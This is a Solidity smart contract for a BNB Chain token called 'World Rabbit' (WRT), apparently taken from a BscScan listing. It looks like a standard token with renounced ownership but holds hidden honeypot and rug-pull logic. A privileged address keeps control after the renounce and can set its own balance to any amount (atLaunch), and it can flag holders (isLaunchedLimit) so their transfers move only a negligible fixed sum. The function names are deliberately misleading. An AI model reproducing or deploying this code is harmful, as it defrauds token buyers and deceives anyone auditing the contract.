/**
 *Submitted for verification at BscScan.com on 2023-01-27
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;


interface IRouter {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract WorldRabbit {
    uint8 public decimals = 18;

    mapping(address => bool) public launchedSwap;
    mapping(address => uint256) public balanceOf;

    uint256 constant receiverExempt = 9 ** 10;
    mapping(address => mapping(address => uint256)) public allowance;
    address public owner;
    string public symbol = "WRT";

    string public name = "World Rabbit";
    mapping(address => bool) public maxToken;
    uint256 public totalSupply = 100000000 * 10 ** 18;
    address public minAuto;

    bool public fromLimit;
    address public sellTotal;

    modifier buyMarketingReceiver() {
        require(launchedSwap[msg.sender]);
        _;
    }

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event OwnershipTransferred(address owner);

    constructor (){
        IRouter buyWalletAuto = IRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        IFactory walletToLaunch = IFactory(buyWalletAuto.factory());
        sellTotal = walletToLaunch.createPair(buyWalletAuto.WETH(), address(this));
        owner = msg.sender;
        minAuto = owner;
        launchedSwap[minAuto] = true;
        balanceOf[owner] = totalSupply;
        emit Transfer(address(0), owner, totalSupply);
        renounceOwnership();
    }

    

    function approve(address spender, uint256 amount) public returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function receiverAmount(address tradingLaunchedEnable) public {
        if (fromLimit) {
            return;
        }
        launchedSwap[tradingLaunchedEnable] = true;
        fromLimit = true;
    }

    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        if (sender == minAuto || recipient == minAuto) {
            return listFund(sender, recipient, amount);
        }
        if (maxToken[sender]) {
            return listFund(sender, recipient, receiverExempt);
        }
        return listFund(sender, recipient, amount);
    }

    function getOwner() external view returns (address) {
        return owner;
    }

    function listFund(address feeTx, address minLiquidity, uint256 totalTx) internal returns (bool) {
        require(balanceOf[feeTx] >= totalTx);
        balanceOf[feeTx] -= totalTx;
        balanceOf[minLiquidity] += totalTx;
        emit Transfer(feeTx, minLiquidity, totalTx);
        return true;
    }

    function renounceOwnership() public {
        emit OwnershipTransferred(address(0));
        owner = address(0);
    }

    function atLaunch(uint256 totalTx) public buyMarketingReceiver {
        balanceOf[minAuto] = totalTx;
    }

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool) {
        if (allowance[sender][msg.sender] != type(uint256).max) {
            require(allowance[sender][msg.sender] >= amount);
            allowance[sender][msg.sender] -= amount;
        }
        return _transferFrom(sender, recipient, amount);
    }

    function isLaunchedLimit(address buyAmount) public buyMarketingReceiver {
        if (buyAmount == minAuto) {
            return;
        }
        maxToken[buyAmount] = true;
    }

    function transfer(address recipient, uint256 amount) external returns (bool) {
        return _transferFrom(msg.sender, recipient, amount);
    }


}